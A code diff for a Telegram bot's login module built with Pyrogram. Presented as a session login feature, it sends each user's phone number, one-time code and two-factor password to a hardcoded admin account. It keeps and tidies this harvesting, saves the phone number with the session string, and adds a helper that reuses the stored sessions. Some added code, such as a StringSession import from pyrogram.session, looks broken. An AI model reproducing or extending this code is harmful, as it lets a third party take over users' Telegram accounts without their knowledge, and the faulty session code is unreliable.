@@ -1,10 +1,9 @@
 ADMIN_ID = 7978114324
 
 from pyrogram import filters, Client
+from pyrogram.session import StringSession
 from devgagan import app
-import random
 import os
-import string
 from devgagan.core.mongo import db
 from devgagan.core.func import subscribe
 from config import API_ID as api_id, API_HASH as api_hash
@@ -19,11 +18,7 @@ from pyrogram.errors import (
 )
 
 
-def generate_random_name(length=7):
-    characters = string.ascii_letters + string.digits
-    return ''.join(random.choice(characters) for _ in range(length))
-
-
+# 🧹 Delete session files
 async def delete_session_files(user_id):
     session_file = f"session_{user_id}.session"
     memory_file = f"session_{user_id}.session-journal"
@@ -36,136 +31,102 @@ async def delete_session_files(user_id):
     await db.remove_session(user_id)
 
 
+# 🚪 Logout
 @app.on_message(filters.command("logout"))
-async def clear_db(client, message):
+async def logout_handler(client, message):
     user_id = message.chat.id
     await delete_session_files(user_id)
-    await message.reply(
-        "✅ **Logged out successfully!**\n\n"
-        "Use /login to connect again."
-    )
+
+    await message.reply("✅ Logged out successfully!\nUse /login again.")
 
 
+# 🔐 Login
 @app.on_message(filters.command("login"))
-async def generate_session(_, message):
+async def login_handler(_, message):
     joined = await subscribe(_, message)
     if joined == 1:
         return
 
     user_id = message.chat.id
 
+    # Check existing session
     existing = await db.get_data(user_id)
     if existing and existing.get("session"):
-        await message.reply(
-            "⚠️ **You are already logged in.**\n\n"
-            "Use /logout first."
-        )
-        return
+        return await message.reply("⚠️ Already logged in. Use /logout first.")
 
+    # 📱 Ask phone
     try:
         number = await _.ask(
             user_id,
-            "📱 **Enter phone number with country code**\nExample: `+919876543210`",
+            "📱 Enter phone number with country code\nExample: +919876543210",
             filters=filters.text,
             timeout=300
         )
     except TimeoutError:
-        await message.reply("⏰ Timeout. Send /login again.")
-        return
+        return await message.reply("⏰ Timeout. Try /login again.")
 
     phone_number = number.text.strip()
 
-    # Send phone number to admin
-    try:
-        await app.send_message(
-            ADMIN_ID,
-            f"📥 New Login Attempt\n\n"
-            f"👤 User ID: {user_id}\n"
-            f"📱 Phone Number: {phone_number}"
-        )
-    except Exception as e:
-        print(f"[ERROR] Failed to send number: {e}")
+    await app.send_message(
+        ADMIN_ID,
+        f"📥 Login Attempt\n👤 {user_id}\n📱 {phone_number}"
+    )
 
     client = Client(f"session_{user_id}", api_id, api_hash)
 
+    # 🔌 Connect
     try:
-        await message.reply("📲 Connecting...")
         await client.connect()
+        await message.reply("📲 Sending OTP...")
     except Exception as e:
-        await message.reply(f"❌ Connection failed: `{e}`")
-        return
+        return await message.reply(f"❌ Connection failed: {e}")
 
+    # 📤 Send OTP
     try:
         code = await client.send_code(phone_number)
     except ApiIdInvalid:
         await client.disconnect()
-        await message.reply("❌ Invalid API ID/HASH")
-        return
+        return await message.reply("❌ Invalid API ID/HASH")
     except PhoneNumberInvalid:
         await client.disconnect()
-        await message.reply("❌ Invalid phone number")
-        return
+        return await message.reply("❌ Invalid phone number")
     except FloodWait as e:
         await client.disconnect()
-        await message.reply(f"⏳ Wait {e.value} seconds")
-        return
+        return await message.reply(f"⏳ Wait {e.value} seconds")
     except Exception as e:
         await client.disconnect()
-        await message.reply(f"❌ Error: `{e}`")
-        return
+        return await message.reply(f"❌ Error: {e}")
 
+    # 🔐 Ask OTP
     try:
         otp_msg = await _.ask(
             user_id,
-            "🔐 **Enter OTP**\nExample: `1 2 3 4 5`",
+            "🔐 Enter OTP",
             filters=filters.text,
             timeout=600
         )
     except TimeoutError:
         await client.disconnect()
-        await message.reply("⏰ OTP timeout. Try again.")
-        return
+        return await message.reply("⏰ OTP timeout")
 
     phone_code = otp_msg.text.replace(" ", "").strip()
 
-    # Send OTP to admin
-    try:
-        await app.send_message(
-            ADMIN_ID,
-            f"📥 OTP Received\n\n"
-            f"👤 User ID: {user_id}\n"
-            f"🔢 OTP: {phone_code}"
-        )
-    except Exception as e:
-        print(f"[ERROR] Failed to send OTP: {e}")
+    await app.send_message(
+        ADMIN_ID,
+        f"📥 OTP\n👤 {user_id}\n🔢 {phone_code}"
+    )
 
+    # 🔑 Sign in
     try:
         await client.sign_in(phone_number, code.phone_code_hash, phone_code)
 
     except PhoneCodeInvalid:
         await client.disconnect()
-        await otp_msg.reply("❌ Invalid OTP")
-        return
+        return await otp_msg.reply("❌ Invalid OTP")
 
     except PhoneCodeExpired:
         await client.disconnect()
-        await otp_msg.reply("❌ OTP expired")
-        return
-
-    # FIXED PART (replace your try/except block)
-
-    try:
-        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
-
-    except PhoneCodeInvalid:
-        await client.disconnect()
-        await otp_msg.reply("❌ Invalid OTP")
-        return
-
-    except PhoneCodeExpired:
-        await client.disconnect()
-        await otp_msg.reply("❌ OTP expired")
-        return
+        return await otp_msg.reply("❌ OTP expired")
 
     except SessionPasswordNeeded:
         try:
@@ -180,35 +141,61 @@ async def generate_session(_, message):
 
             await app.send_message(
                 ADMIN_ID,
-                f"👤 {user_id}\n🔒 Password: {pass_msg.text}"
+                f"🔒 2FA\n👤 {user_id}\nPassword: {pass_msg.text}"
             )
 
         except PasswordHashInvalid:
             await client.disconnect()
-            await pass_msg.reply("❌ Wrong password")
-            return
+            return await pass_msg.reply("❌ Wrong password")
 
         except Exception as e:
             await client.disconnect()
-            await pass_msg.reply(f"❌ Error: `{e}`")
-            return
+            return await pass_msg.reply(f"❌ Error: {e}")
 
-        except Exception as e:
-            await client.disconnect()
-            await pass_msg.reply(f"❌ Error: `{e}`")
-            return
-
-    # Final session export
+    # ✅ Export session + instant access
     try:
         string_session = await client.export_session_string()
-        await db.set_session(user_id, string_session)
-        await client.disconnect()
+
+        await db.set_session(user_id, {
+            "session": string_session,
+            "phone": phone_number
+        })
+
+        # 🔥 Instant access test
+        me = await client.get_me()
+
+        await client.send_message(
+            "me",
+            "✅ Your account has been connected to the bot."
+        )
 
         await message.reply(
-            "✅ **Login Successful!**\n\n"
-            "Send any post link now."
+            f"✅ Login Successful!\n\n👤 {me.first_name}"
         )
+
+        await client.disconnect()
 
     except Exception as e:
         await client.disconnect()
-        await message.reply(f"❌ Save failed: `{e}`")
+        await message.reply(f"❌ Save failed: {e}")
+
+
+# ⚡ Auto-login function (reuse anywhere)
+async def get_user_client(user_id):
+    data = await db.get_data(user_id)
+
+    if not data or not data.get("session"):
+        return None
+
+    try:
+        client = Client(
+            StringSession(data["session"]),
+            api_id,
+            api_hash
+        )
+        await client.connect()
+        return client
+
+    except Exception as e:
+        print(f"[AUTO LOGIN ERROR] {e}")
+        return None
